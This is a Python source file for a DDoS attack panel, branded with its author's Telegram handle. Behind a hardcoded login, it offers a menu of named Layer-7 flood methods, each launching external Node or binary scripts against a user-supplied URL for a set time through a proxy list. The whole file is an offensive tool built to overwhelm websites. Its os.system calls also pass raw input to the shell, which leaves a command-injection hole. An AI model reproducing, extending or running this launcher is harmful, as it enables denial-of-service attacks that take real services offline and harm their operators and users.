# -*- coding: utf-8 -*-
from operator import index
import socket
import random
import string
import threading
import getpass
import urllib
import getpass
import colorama
import os,sys,time,re,requests,json
from requests import post
from time import sleep
from datetime import datetime, date
import codecs

author = ""

def prints(start_color, end_color, text):
    start_r, start_g, start_b = start_color
    end_r, end_g, end_b = end_color

    for i in range(len(text)):
        r = int(start_r + (end_r - start_r) * i / len(text))
        g = int(start_g + (end_g - start_g) * i / len(text))
        b = int(start_b + (end_b - start_b) * i / len(text))

        color_code = f"\033[38;2;{r};{g};{b}m"
        print(color_code + text[i], end="")
    
start_color = (255, 255, 255)
end_color = (0, 0, 255)

class Color:
    colorama.init()

def help():
	os.system('cls' if os.name == 'nt' else 'clear')
	print("""\033[36m
$$\   $$\ $$$$$$$$\ $$\       $$$$$$$\  
$$ |  $$ |$$  _____|$$ |      $$  __$$\ 
$$ |  $$ |$$ |      $$ |      $$ |  $$ |
$$$$$$$$ |$$$$$\    $$ |      $$$$$$$  |
$$  __$$ |$$  __|   $$ |      $$  ____/ 
$$ |  $$ |$$ |      $$ |      $$ |      
$$ |  $$ |$$$$$$$$\ $$$$$$$$\ $$ |      
\__|  \__|\________|\________|\__|      
                                        
                                        
                                        
                              WELCOME TO DDOS BY GMFR444X
                TYPE THE \033[36m[\033[32mMETHODS\033[36m] \033[36m[\033[32mURL\033[36m] \033[36m[\033[32mTIME\033[36m] TO START ATTACK
                         AUTHOR IN TELEGRAM : @GMFR444X
                         •   BOLT \033[36m[\033[32mL7\033[36m]    •   YOLO \033[36m[\033[32mL7\033[36m] 
                         •   OMG  \033[36m[\033[32mL7\033[36m]    •   TLS  \033[36m[\033[32mL7\033[36m]
                         •   NOX  \033[36m[\033[32mL7\033[36m]    •   NEW  \033[36m[\033[32mL7\033[36m]
                         •   404  \033[36m[\033[32mL7\033[36m]    •   RAND \033[36m[\033[32mL7\033[36m]
                         •   TLS2 \033[36m[\033[32mL7\033[36m]    •   BOMB \033[36m[\033[32mL7\033[36m]
                         •   NUKE \033[36m[\033[32mL7\033[36m]    •   MIX  \033[36m[\033[32mL7\033[36m] 
                         • BYPASS \033[36m[\033[32mL7\033[36m]    •  SUPER \033[36m[\033[32mL7\033[36m] 

                         Gunakan ctrl + c untuk berhenti attack
                     
\033[0m""")

def main():
	os.system('cls' if os.name == 'nt' else 'clear')
	print("""\033[36m
╭━━━┳━╮╭━┳━━━┳━━━┳━━━┳━━━╮
┃╭━╮┃┃╰╯┃┃╭━━┫╭━╮┃╭━╮┃╭━╮┃
┃┃╱╰┫╭╮╭╮┃╰━━┫╰━╯┃┃╱╰┻╯╭╯┃
┃┃╭━┫┃┃┃┃┃╭━━┫╭╮╭┫┃╱╭┳━╯╭╯
┃╰┻━┃┃┃┃┃┃┃╱╱┃┃┃╰┫╰━╯┃┃╰━╮
╰━━━┻╯╰╯╰┻╯╱╱╰╯╰━┻━━━┻━━━╯
                              WELCOME TO DDOS BY GMFR444X
		   	 TYPE \033[36m[\033[32mHELP\033[36m] TO SEE OUR METHODS
                         AUTHOR IN TELEGRAM : @GMFR444X⠀⠀
\033[0m""")

	while True:
		sys.stdout.write(f"\x1b]2;[\] GMFRC2 :: Online Users: [1] :: Attack Sended: [1/10]\x07")
		sin = input("\033[0;30;46madminO@user\x1b[1;37m\033[0m:~# \x1b[1;37m\033[0m")
		sinput = sin.split(" ")[0]
		if sinput == "clear":
			os.system ("clear")
			main()
		if sinput == "cls" or sinput == "CLS":
			os.system ("clear")
			main()
		if sinput == "help" or sinput == "HELP" or sinput == ".help" or sinput == ".HELP" or sinput == "menu" or sinput == ".menu" or sinput == "MENU" or sinput == ".MENU":
			help()

#########LAYER-7########  
		elif sinput == "BOLT" or sinput == "bolt":
			try:
				url = sin.split()[1]
				time = sin.split()[2]
				os.system(f'cd L7 && ./BOLT {url} {time} 64 10')
				os.system ("clear")
			except ValueError:
				main()
			except IndexError:
				main()

		elif sinput == "OMG" or sinput == "omg":
			try:
				url = sin.split()[1]
				time = sin.split()[2]
				os.system(f'cd L7 && ./OMG GET {url} proxy.txt {time} 64 10')
				os.system ("clear")
			except ValueError:
				main()
			except IndexError:
				main()
			
		elif sinput == "YOLO" or sinput == "yolo":
			try:
				url = sin.split()[1]
				time = sin.split()[2]
				os.system(f'cd L7 && node YOLO.js {url} {time} 64 10 proxy.txt')
				os.system ("clear")
			except ValueError:
				main()
			except IndexError:
				main()

		elif sinput == "TLS" or sinput == "tls":
			try:
				url = sin.split()[1]
				time = sin.split()[2]
				os.system(f'cd L7 && node TLS-SILIT.js {url} {time} 64 10 proxy.txt')
				os.system ("clear")
			except ValueError:
				main()
			except IndexError:
				main()

		elif sinput == "NOX" or sinput == "nox":
			try:
				url = sin.split()[1]
				time = sin.split()[2]
				os.system(f'cd L7 && node NOX.js {url} {time} 64 10 proxy.txt')
				os.system ("clear")
			except ValueError:
				main()
			except IndexError:
				main()

		elif sinput == "NEW" or sinput == "new":
			try:
				url = sin.split()[1]
				time = sin.split()[2]
				os.system(f'cd L7 && node new.js {url} {time} 512 10 proxy.txt')
				os.system ("clear")
			except ValueError:
				main()
			except IndexError:
				main()

		elif sinput == "404":
			try:
				url = sin.split()[1]
				time = sin.split()[2]
				os.system(f'cd L7 && node 404.js {url} {time} 64 10 proxy.txt')
				os.system ("clear")
			except ValueError:
				main()
			except IndexError:
				main()
				
		elif sinput == "TLS2":
			try:
				url = sin.split()[1]
				time = sin.split()[2]
				os.system(f'cd L7 && node TLS2.js {url} {time} 64 10 proxy.txt')
				os.system ("clear")
			except ValueError:
				main()
			except IndexError:
				main()
		
		elif sinput == "NUKE":
			try:
				url = sin.split()[1]
				time = sin.split()[2]
				os.system(f'cd L7 && node Nuke.js {url} {time} 10 proxy.txt 512')
				os.system ("clear")
			except ValueError:
				main()
			except IndexError:
				main()		
		
		elif sinput == "MIX":
			try:
				url = sin.split()[1]
				time = sin.split()[2]
				os.system(f'cd L7 && node MIX-SYN.js {url} 10 {time}')
				os.system ("clear")
			except ValueError:
				main()
			except IndexError:
				main()	
						
		elif sinput == "RAND":
			try:
				url = sin.split()[1]
				time = sin.split()[2]
				os.system(f'cd L7 && node HTTP-RAND.js {url} {time}')
				os.system ("clear")
			except ValueError:
				main()
			except IndexError:
				main()	
	
		elif sinput == "BOMB" or sinput == "bomb":
			try:
				url = sin.split()[1]
				time = sin.split()[2]
				os.system(f'cd L7 && node BOMB.js {url} {time} 512 10 proxy.txt')
				os.system ("clear")
			except ValueError:
				main()
			except IndexError:
				main()		
		
		elif sinput == "BYPASS":
			try:
				url = sin.split()[1]
				time = sin.split()[2]
				os.system(f'cd L7 && node bypass.js {url} {time} 512 10 proxy.txt')
				os.system ("clear")
			except ValueError:
				main()
			except IndexError:
				main()
				
		elif sinput == "SUPER":
			try:
				url = sin.split()[1]
				time = sin.split()[2]
				os.system(f'cd L7 && node TLS-SUPERV1.js {url} {time} 512 10 proxy.txt')
				os.system ("clear")
			except ValueError:
				main()
			except IndexError:
				main()	
 		
 
def login():
	sys.stdout.write(f"\x1b]2;[\] Galaxy :: Online Users: [1] :: Attack Sended: [1/10]\x07")
	os.system('cls' if os.name == 'nt' else 'clear')
	user = "admin"
	passwd = "user"
	username = input("""\033[36m
$$\      $$\           $$\                                             
$$ | $\  $$ |          $$ |                                            
$$ |$$$\ $$ | $$$$$$\  $$ | $$$$$$$\  $$$$$$\  $$$$$$\$$$$\   $$$$$$\  
$$ $$ $$\$$ |$$  __$$\ $$ |$$  _____|$$  __$$\ $$  _$$  _$$\ $$  __$$\ 
$$$$  _$$$$ |$$$$$$$$ |$$ |$$ /      $$ /  $$ |$$ / $$ / $$ |$$$$$$$$ |
$$$  / \$$$ |$$   ____|$$ |$$ |      $$ |  $$ |$$ | $$ | $$ |$$   ____|
$$  /   \$$ |\$$$$$$$\ $$ |\$$$$$$$\ \$$$$$$  |$$ | $$ | $$ |\$$$$$$$\ 
\__/     \__| \_______|\__| \_______| \______/ \__| \__| \__| \_______|
                                                                       
                                                                       
                                                                       
                              WELCOME TO DDOS BY GMFR444X
		BEFORE USE OUR PANEL YOU MUST LOGIN TO UR ACCOUNT
                          AUTHOR IN TELEGRAM : @GMFR444X⠀⠀
						   
\033[36m[\033[32mUSERNAME\033[36m]:\033[0m """)
	password = getpass.getpass(prompt='\033[36m[\033[32mPASSWORD\033[36m]:\033[0m ')
	if username != user or password != passwd:
		print("")
		sys.exit(1)
	elif username == user and password == passwd:
		print("\033[36mSuccessfully Login to ur Account")
		time.sleep(1)
		main()

login()